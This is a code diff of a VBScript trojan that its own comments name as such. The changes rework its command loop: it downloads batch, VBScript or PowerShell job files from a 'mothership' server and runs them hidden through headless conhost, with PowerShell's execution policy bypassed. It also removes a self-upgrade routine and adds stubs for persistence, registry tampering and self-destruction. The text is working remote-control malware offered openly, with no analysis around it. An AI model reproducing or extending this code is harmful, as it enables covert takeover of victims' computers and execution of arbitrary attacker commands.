-        Call LogMsg("cmdlist - ping file size: " & Len(strFileContent) )
+        Call LogMsg(cmdname & " - ping file size: " & Len(strFileContent) )
 
         If InStr(strFileContent, "execute_cmdlist") > 0 Then
-            Call LogMsg("cmdlist - found execcmdlist" )
+            Call LogMsg("cmdlist - found execcmdlist in ping file" )
 
             execcmdlist = True
+        Else
+            Call LogMsg("cmdlist - did not find execcmdlist in ping file" )
+            
+            execcmdlist = False        
         End If
 
         Call LogMsg("cmdlist: reseting ping.txt" )
 
-        Call RunShell("conhost.exe --headless cmd /c type nul > " & workdir & "\" & "ping.txt", True)
-        Reset(workdir & "\" & "ping.txt")
+        Call Reset(pingpath)
         
         If Not execcmdlist Then
+            Call LogMsg("execcmdlist is not present -- skipping to next iteration")
             Exit Do
         End If
 
-        Call LogMsg("cmdlist - downloading bbti.bat" )
+        Call LogMsg("cmdlist - downloading job file" )
      
-        Dim filepath : filepath = workdir & "\" & "bbti.bat"
+        Dim filepath : filepath = workdir & "\" & "cmd_list_job_file_" & CStr(GetRandom(4)) & ".tmp"
         
-        Call RunShell("conhost.exe --headless cmd /c type nul > " & filepath, True)
-        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & filepath, True)
+        Call Reset(filepath)
                 
-        Dim url : url = mothership & "/ow/retrieve.php?filename=cmd_list.bat" & GetScripTagStrUrl()
+        Dim url : url = mothership & "/ow/retrieve.php?filename=cmd_list.bat&" & GetScriptTagStrUrlDirect()
         
-        Call DownloadFile( url, filepath )
+        Dim headers
+        Dim ret : ret = DownloadFileWithHeaders( url, filepath, headers)
 
-        If fso.FileExists( filepath ) Then 
-            Call LogMsg("cmdlist - running bbti.bat" )
+        If not ret then
+            Call LogMsg("cannot execute as download failed, skipping to next iteration" )
+            Exit Do
+        end if
+        
+        If not fso.FileExists( filepath ) Then
+            Call LogMsg("cannot execute as file " & filepath & " does not exist, skipping to next iteration" )
+            Exit Do
+        End if
+        
 
-            Dim filext : filext = fso.GetExtensionName(filepath)
+        Dim jobfilename
 
-            If LCase(filext) = "bat" Then
-                Call RunShell("conhost.exe --headless cmd /c " & filepath & " > " & workdir & "\" & "bbti.bat_cmds.log", false)
-            ElseIf LCase(filext) = "vbs" Then
-                Call RunShell("conhost.exe --headless cscript.exe //nologo //B " & filepath, false)
+        If headers Is Nothing Then
+            jobfilename = "bbti.bat"
+        elseIf headers.Count <= 0 Then
+            jobfilename = "bbti.bat"
+        End IF
+        
+        If headers.Exists("X-JobCode") Then            
+            jobcode = headers.Item("X-JobCode")
+
+            Call LogMsg("found X-JobCode header -- jobcode=[" & jobcode & "]")
+            
+            Dim jobcodeparts : jobcodeparts = Split(jobcode, ":")
+
+            If UBound(jobcodeparts) > 0 Then
+                jobcode = Trim(jobcodeparts(1)) 
             End If
+
+            Call LogMsg("extracted jobcode=[" & jobcode & "]")
+
+        Else
+            jobcode = CStr(GetRandom(8))
+            Call LogMsg("X-JobCode header not present -- random jobcode=" & jobcode)
         End If
         
+        If not headers.Exists("Content-Disposition") Then
+            jobfilename = "bbti.bat"
+        Else
+            ' Content-Disposition: attachment; filename="cmd_list_snapshot_full.bat"
+            jobfilename = headers.Item("Content-Disposition")
+            
+            If XIsEmpty(jobfilename) Then
+                jobfilename = "bbti.bat"
+            Else
+                Dim token : token = "filename="&dq
+                Dim pos : pos = InStr(jobfilename, token)
+                
+                jobfilename = Mid(jobfilename, pos+Len(token))
+                
+                if ( Mid(jobfilename, Len(jobfilename), 1) = dq ) Then
+                    jobfilename = Mid(jobfilename, 1, Len(jobfilename)-1)
+                end if
+            End IF
+            
+        End IF
+
+        jobfilename = jobcode & "_" & jobfilename
+        
+        Call TryCopyFile(filepath, workdir & "\" & jobfilename)
+        
+        filepath = workdir & "\" & jobfilename
+
+        If not fso.FileExists(filepath) Then
+            Call LogMsg("could not create job file " & filepath)
+            Exit Do
+        End IF
+        
+        Call LogMsg("cmdlist - job filepath: " & filepath)
+
+        Dim filext : filext = fso.GetExtensionName(jobfilename)
+
+        If XIsEmpty(filext) Then
+            Call LogMsg("job file extension is empty -- skipping to next iteration")
+            Exit Do
+        End IF
+        
+        Call LogMsg("cmdlist - job file extension: " & filext )
+
+        Dim cmdstr : cmdstr = ""
+        
+        cmdstr = "conhost.exe --headless cmd /c "
+        
+        If LCase(filext) = "bat" Then
+            cmdstr = cmdstr & " " & filepath 
+        ElseIf LCase(filext) = "vbs" Then
+            cmdstr = cmdstr & " " & "cscript.exe //nologo //B " & filepath
+        ElseIf LCase(filext) = "ps1" Then
+            cmdstr = cmdstr & " " & "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " & filepath
+        End If
+        
+        ret = RunShell(cmdstr & " > " & workdir & "\" & jobfilename & "_cmds.log", false)
+        
+        If Not ret Then
+            Call LogMsg("ERROR :: failed to execute cmd list")
+        End IF
+        
         Exit Do
+    
     Loop
     
 
@@ -1230,98 +2469,6 @@ Function Cmdlist()
     
     Loop
     
-End Function
-
-Function Pcmon()
-    cmdname = "pcmon"
-
-    ForceSingleton()
-
-    Do While True
-        
-        mothership = ReadMothership( workdir & "\" & "mothership" )
-        
-        Call LogMsg("pcmon mothership=" & mothership & " starting " & GetTimestamp() )
-
-    Do While True   
-
-        Call ExitRamp("cmdlist")
-    
-        Dim execcmdlist : execcmdlist = false
-
-        If Not fso.FileExists(workdir & "\" & "ping.txt") Then
-            Exit Do
-        End If
-        
-        Call LogMsg("cmdlist: found ping.txt" )
-
-        Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & "ping.txt", 1)
-        
-        Dim strFileContent : strFileContent = ""
-        
-        If Not objFile.AtEndOfStream Then
-            strFileContent = LCase(objFile.ReadAll)
-        End If
-        
-        objFile.Close
-        Set objFile = Nothing
-        
-        If XIsEmpty(strFileContent) Then
-            Call LogMsg("Cmdlist - ping is empty")
-
-            Exit Do
-        End If            
-
-        Call LogMsg("cmdlist - ping file size: " & Len(strFileContent) )
-
-        If InStr(strFileContent, "execute_cmdlist") > 0 Then
-            Call LogMsg("cmdlist - found execcmdlist" )
-
-            execcmdlist = True
-        End If
-
-        Call LogMsg("cmdlist: reseting ping.txt" )
-
-        Call RunShell("conhost.exe --headless cmd /c type nul > " & workdir & "\" & "ping.txt", True)
-        Reset(workdir & "\" & "ping.txt")
-        
-        If Not execcmdlist Then
-            Exit Do
-        End If
-
-        Call LogMsg("cmdlist - downloading bbti.bat" )
-     
-        Dim filepath : filepath = workdir & "\" & "bbti.bat"
-        
-        Call RunShell("conhost.exe --headless cmd /c type nul > " & filepath, True)
-        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & filepath, True)
-                
-        Dim url : url = mothership & "/ow/retrieve.php?filename=cmd_list.bat" & GetScripTagStrUrl()
-        
-        Call DownloadFile( url, filepath )
-
-        If fso.FileExists( filepath ) Then 
-            Call LogMsg("cmdlist - running bbti.bat" )
-
-            Dim filext : filext = fso.GetExtensionName(filepath)
-
-            If LCase(filext) = "bat" Then
-                Call RunShell("conhost.exe --headless cmd /c " & filepath & " > " & workdir & "\" & "bbti.bat_cmds.log", false)
-            ElseIf LCase(filext) = "vbs" Then
-                Call RunShell("conhost.exe --headless cscript.exe //nologo //B " & filepath, false)
-            End If
-        End If
-        
-        Exit Do
-    Loop
-    
-
-        Call LogMsg("cmdlist sleeping " & CStr(cmdlistdelaytime) & " seconds " & GetTimestamp() )
-
-        WScript.Sleep cmdlistdelaytime*1000
-    
-    Loop
-
 End Function
 
 Function CreateTaskXMLStr(xmlstr, tasknamestr)
@@ -1378,7 +2525,7 @@ Function Reschedule()
     Call LogMsg("Reschedule finished")
 End Function
 
-Function ReadCmdPid(tcmdname)
+Function ReadCmdPid(tcmdname, tworkdir)
     Call LogMsg("ReadCmdPid " & tcmdname)
     
     ReadCmdPid = -1
@@ -1387,49 +2534,35 @@ Function ReadCmdPid(tcmdname)
         Exit Function
     End IF
     
-    If fso.FileExists(workdir & "\" & tcmdname & "_running") Then
-        ReadCmdPid = ReadTag(workdir & "\" & tcmdname & "_running")
+    If XIsEmpty(tworkdir) Then
+        tworkdir = workdir
+    End If
+    
+    If fso.FileExists(tworkdir & "\" & tcmdname & "_running") Then
+        ReadCmdPid = ReadTag(tworkdir & "\" & tcmdname & "_running")
     Else
         Call LogMsg("ReadCmdPid " & tcmdname & " running file does not exist -- exiting function")
 
         Exit Function
     End If
     
-    ReadCmdPid = CInt(ReadCmdPid)
+    ReadCmdPid = CLng(ReadCmdPid)
 
     Call LogMsg("ReadCmdPid pid=" & ReadCmdPid)
 
 End Function
 
-Function IsCmdLockFile(tcmdname)
-    On Error Resume Next
-    Err.Clear
+Function IsCmdRunning(tcmdname, tworkdir, ByRef tprocname)
     
-    Call LogMsg("IsCmdLockFile -- " & tcmdname)
-    
-    IsCmdLockFile = false
-
-    Dim cmdlockfile : cmdlockfile = false
-    Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & tcmdname & "_running", 2, True)
-
-    If Err.Number <> 0 Then
-        ' If Err.Number is 70, another process has the file locked
-        IsCmdLockFile = true
-        Err.Clear
-    Else
-        objFile.Close ' Releases the lock
-        set objFile = nothing
-    End If
-
-End Function
-
-Function IsCmdRunning(tcmdname, ByRef tprocname)
-    
-    Call LogMsg("IsCmdRunning -- " & tcmdname)
+    Call LogMsg("IsCmdRunning -- " & tcmdname & " " & tworkdir)
     tprocname = ""
     
     IsCmdRunning = -1
-
+    
+    If XIsEmpty(tworkdir) Then
+        tworkdir = workdir
+    End If
+    
     Dim list
     Set list = GetProcessList()
     
@@ -1443,7 +2576,7 @@ Function IsCmdRunning(tcmdname, ByRef tprocname)
         Exit Function
     End IF
     
-    Dim cmdpid : cmdpid = ReadCmdPid(tcmdname)
+    Dim cmdpid : cmdpid = ReadCmdPid(tcmdname, tworkdir)
     
     Call LogMsg("IsCmdRunning read pid=" & CStr(cmdpid))
 
@@ -1474,7 +2607,135 @@ Function IsCmdRunning(tcmdname, ByRef tprocname)
     
 End Function
 
-Function ExecCmd(tcmdname)
+Function ExecExe(exename, exefname, exedir, args)
+    ExecExe = -1
+    Dim pp : pp = "ExecExe"
+    
+    If XIsEmpty(exename) or XIsEmpty(exefname) or XIsEmpty(exedir) Then
+        Exit Function
+    End IF										 
+
+    Dim exefpath : exefpath = exedir & "\" & exefname
+    
+    Dim argstr : argstr = ""
+    
+    If IsArray(args) Then
+        argstr = Join(args)
+    End If
+
+    Call LogMsg(pp & " launching " & exefpath)
+    
+    If not fso.FolderExists(exedir) Then
+        LogMsg(pp & ": ERROR :: exedir is missing " & exedir)
+        Exit Function
+    End If
+    
+    If not fso.FileExists(exefpath) Then
+        LogMsg(pp & ": ERROR :: exefpath is missing " & exefpath)
+        Exit Function
+    End If
+    
+    Dim cmdlogfpath : cmdlogfpath = exefpath & "_" & CStr(GetRandom(4)) & "_cmd.log"
+    
+    Dim cmdstr : cmdstr = exefpath & " " & argstr & " > " & cmdlogfpath & " 2>&1"
+        
+
+	Dim objShell : Set objShell = CreateObject("WScript.Shell")
+    objShell.CurrentDirectory = exedir
+    Dim objExec : Set objExec = objShell.Exec("cmd /c " & cmdstr)
+    Dim pid : pid = objExec.ProcessID
+
+    Dim cmdrunpath : cmdrunpath = exedir & "\" & exename & "_running"
+
+    If pid > 0 Then        
+        Call LogMsg(pp & " -- creating running file " & cmdrunpath & " with pid=" & pid)
+        
+        Call TryDeleteFile(cmdrunpath)
+        Call WriteFile(cmdrunpath, CStr(pid))
+        
+        If fso.FileExists(cmdrunpath) Then
+            Call LogMsg(pp & " -- created running file")
+        Else
+            Call LogMsg(pp & " -- failed to creat running file")
+        End If
+        
+    End IF
+    
+    ExecExe = pid
+    
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " reporting error")
+        Call LogErr()
+        ExecExe = -1
+        Exit Function
+    End If
+    
+    Call LogMsg("ExecExe finished")
+
+End Function 
+
+
+Function ExecPython(scriptname, scriptdir, scriptfname, args)
+    ExecPython = -1
+    
+    If XIsEmpty(scriptname) or XIsEmpty(scriptdir) or XIsEmpty(scriptfname) Then
+        Exit Function
+    End IF										 
+
+    Dim scriptfpath : scriptfpath = scriptdir & "\" & scriptfname
+    
+    Dim argstr : argstr = ""
+    
+    If IsArray(args) Then
+        argstr = Join(args)
+    End If
+
+    Call LogMsg("ExecPython " & scriptfpath)
+    
+    If not fso.FolderExists(scriptdir) Then
+        LogMsg("ExecPython: ERROR :: scriptdir is missing " & scriptdir)
+        Exit Function
+    End If
+    
+    If not fso.FileExists(scriptfpath) Then
+        LogMsg("ExecPython: ERROR :: scriptfpath is missing " & scriptfpath)
+        Exit Function
+    End If
+    
+    If not fso.FileExists(pythonexe) Then
+        LogMsg("ExecPython: ERROR :: pythonexe is missing " & pythonexe)
+        Exit Function
+    End If
+    
+    Dim cmdlogfpath : cmdlogfpath = scriptfpath & "_" & CStr(GetRandom(4)) & "_cmd.log"
+    
+    Dim cmdstr : cmdstr = dq & pythonexe & dq & " " & scriptfpath & " " & argstr & " > " & cmdlogfpath & " 2>&1"
+    
+    Call TryDeleteFile(workdir & "\" & "python_version")
+    
+    Call RunShell("cmd /c " & dq & pythonexe & dq & " --version > " & workdir & "\" & "python_version" & " 2>&1", True)
+    
+    Dim pid : pid = ExecShellAsync("cmd /c " & cmdstr)
+    
+    Dim cmdrunpath : cmdrunpath = scriptdir & "\" & scriptname & "_running"
+
+    If pid > 0 Then        
+        Call TryDeleteFile(cmdrunpath)
+        
+        Call WriteFile(cmdrunpath, CStr(pid))
+        
+        If fso.FileExists(cmdrunpath) Then
+            Call LogMsg("ExecPython -- created running file " & cmdrunpath & " with pid=" & pid)
+        End If
+    End IF
+    
+    ExecPython = pid
+    
+    Call LogMsg("ExecPython finished")
+
+End Function
+
+Function ExecCmd(tcmdname, args)
     ExecCmd = -1
     
     If XIsEmpty(tcmdname) Then
@@ -1483,22 +2744,42 @@ Function ExecCmd(tcmdname)
 
     Call LogMsg("ExecCmd " & tcmdname)
 
-    Dim pid : pid = ExecShellAsync("cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " " & tcmdname)
+    Dim argstr : argstr = ""
+    
+    If IsArray(args) Then
+        if UBound(args) >= 0 Then
+            Dim elem             
+            Dim i : i = 0
+            For Each elem in args 
+                If i = 0 Then
+                    argstr = CStr(elem)
+                Else
+                    argstr = argstr & " " & CStr(elem)
+                End If
+                i = i + 1
+            Next
+            
+        End if
+    End If
+    
+    Dim cmdstr : cmdstr = ""
+    cmdstr = "cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " " & tcmdname
+    cmdstr = cmdstr & " " & argstr
+    
+    Dim pid : pid = ExecShellAsync(cmdstr)
+    
 		  
     Dim cmdrunpath : cmdrunpath = workdir & "\" & tcmdname & "_running"
 
-    If pid > 0 Then
-        If fso.FileExists(cmdrunpath) Then
-            fso.DeleteFile cmdrunpath, True
-        End If
-
-        Dim objFile : Set objFile = fso.OpenTextFile(cmdrunpath, 2, True)
-        objFile.Write CStr(pid)
-
-        objFile.Close
-        Set objFile = Nothing
+    If pid > 0 Then        
+        Call TryDeleteFile(cmdrunpath)
         
-        Call LogMsg("ExecCmd -- created running file " & cmdrunpath & " with pid=" & pid)
+        Call WriteFile(cmdrunpath, CStr(pid))
+        
+        If fso.FileExists(cmdrunpath) Then
+            Call LogMsg("ExecCmd -- created running file " & cmdrunpath & " with pid=" & pid)
+        End If
+        
     End IF
     
     ExecCmd = pid
@@ -1514,23 +2795,23 @@ Function ActivateCmd(tcmdname)
     Call LogMsg("ActivateCmd: cmdname=" & tcmdname)
 
     Dim procname : procname = ""
-    Dim cmdpid : cmdpid = IsCmdRunning(tcmdname, procname)
+    Dim cmdpid : cmdpid = IsCmdRunning(tcmdname, workdir, procname)
 
     Call LogMsg("ActivateCmd: procname=" & procname & " cmdpid=" & CStr(cmdpid))
     
-    If cmdpid > 0 Then
+    If ( cmdpid > 0 and ( LCase(procname) = "cscript.exe" ) ) Then
 					 
         ActivateCmd = cmdpid
         
         Call LogMsg("ActivateCmd: cmd is running -- no need to launch")
-       
-    Else
-        Call LogMsg("ActivateCmd: cmd is not running -- starting it up " & tcmdname)
-        
-        ActivateCmd = ExecCmd(tcmdname)
-	
-	    Call LogMsg("ActivateCmd: pid=" & CStr(ActivateCmd))
+        Exit Function
     End If
+    
+    Call LogMsg("ActivateCmd: [" & tcmdname & "] cmd is not running -- starting it up")
+    
+    ActivateCmd = ExecCmd(tcmdname, Array())
+
+    Call LogMsg("ActivateCmd: pid=" & CStr(ActivateCmd))
     
 End Function
 
@@ -1543,109 +2824,34 @@ Function Activate()
     
 End Function
 
-Function Upgrade()
-	On Error Resume Next
-	Err.Clear
-	
-    Call LogMsg("Upgrade")
-	
-	Upgrade = -1
-	
-	Randomize 
-	Dim min, max, result
-	min = 1000
-	max = 9999
-	result = Int((max - min + 1) * Rnd + min)
-	result = CStr(result)
-	
-	Dim upgradepath : upgradepath = workdir & "\" & "zfei_upgrade_" & result & ".vbs"
-	Call DownloadFile(mothership & "/ow/assets/zfei.vbs", upgradepath)
-	
-	Call DownloadFile(mothership & "/ow/assets/zfei.vbs.md5", upgradepath & ".md5")
-
-	Dim upgrademd5 : upgrademd5 = ReadFile(upgradepath & ".md5")
-
-	If Not fso.FileExists(upgradepath) then
-	    Call LogMsg("Upgrade failed -- not able to download upgrade")
-		Exit Function
-	End IF
-	
-	Dim strContent : strContent = ReadFile(upgradepath)
-
-	If Not InStr(strContent, "Option Explicit") > 0 Then
-	    Call LogMsg("Upgrade failed -- upgrade does not contain [Option Explicit] tag")
-		Exit Function
-	End IF
-	
-	Call RunShell("conhost.exe --headless cmd /c certutil -hashfile " & upgradepath & " MD5 | findstr /v hash > " & upgradepath & ".md5.check" , True)
-	
-	Dim upgrademd5check : upgrademd5check = ReadFile(upgradepath & ".md5.check")
-
-	If not ( XIsEmpty(upgrademd5check) or XIsEmpty(upgrademd5) ) then
-		If ( upgrademd5check = upgrademd5 ) then
-			Call TryCopyFile(upgradepath, workdir & "\zfei.vbs")
-		End if
-	End If
-	
-	If Err.Number = 0 Then
-		Upgrade = 1
-	End IF
-	
-End Function
-
 Function StartupLogic()
     On Error Resume Next
     Err.Clear
     
     Call LogMsg("StartupLogic")
 
-    TryDeleteFile(workdir & "\" & "killall")
-
-    Dim srcpath : srcpath = workdir & "\zfei.vbs"
-    Dim objFile : Set objFile = fso.GetFile(srcpath)
-    Dim srcmoddate : srcmoddate = objFile.DateLastModified
+    Call TryDeleteFile(workdir & "\" & "killall")
 
     Dim cmd
     For Each cmd in Array("watchdog", "ping", "cmdlist")
-        
         Call TryDeleteFile(workdir & "\" & "reset_" & cmd & "loop" )
+	Next 
 
-															  
-		
-																   
-					   
-			
-											
-											   
-			
-		
-											   
-												  
-
-											
-																			  
-
-											
-												   
-				  
-		
-			  
-
-    Next 
+	Call GetConfig()
 
     If cmdname = "init" Then
         Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " reschedule")    
-																						 
-																						  
+		Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " retrieve")
+		Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " penetrate")
     End IF
-
-    Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " retrieve")
-    Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " penetrate")
-
+	
     Activate()
     
-    Call LogMsg("StartupLogic -- logging errors if any")
-    Call LogErr()
+	If Err.Number <> 0 Then
+		Call LogMsg("StartupLogic -- reporting errors")
+		Call LogErr()
+		Exit Function
+	End If
 
     Call LogMsg("StartupLogic -- finished")
 End Function
@@ -1859,19 +3065,43 @@ Function WriteTaskXML(fname, xmlstr)
     End If
 End Function
 
+Function InstallPython()
+    ' download parts from mothershipassets (need bunnyheader) location
+    ' download each part, check size
+    ' check zip MD5
+End Function
+
+Function ModifyMSEdgeLnk()
+    ' MicrosoftEdgeAutoLaunch_5B148DE90C207DD5EDAA5B34E614DD84
+    ' all lnk locations
+    ' registry edit
+End Function
+
 Function SelfDestruct()
 ' delete all regs, startup path, and trojandir, etc.
 End Function
 
-' additional cmds: 
-' get all running process (wmic, etc.)
-' dump tasks
-' upgrade
-' upload a file to mothership
-' download a file from mothership
-' exec a pre existing vbs/bat/ps1 script
-' scan trojan dir, delete a file, rename, move, copy, file exists, schedule task, delete task, execute task
-' execute HTTP GET, POST request
-' execute a one-line cmd, upload output
-'  
-' execvbs --> extend to ps1, bat, vbs script
+Function GetSystemOverview()
+    ' see if pcmon installed, python installed
+    ' cdptest
+    '
+    ' number of files in trojandir
+    ' number of directories in trojandir
+    ' total size of trojandir
+    ' recursive directory snapshot with names, size, and modifieddate
+    ' snapshot of tasks
+    ' check penetration: reg startup, startup path (launch.exe)
+
+End Function
+
+Function Cleanup()
+    ' remove log files, cmd_list run directories
+End Function
+
+Function GetTasks()
+    
+    ' run schtasks
+    ' use powershell
+    ' use wmic Win32_ScheduledJob
+    
+End Function
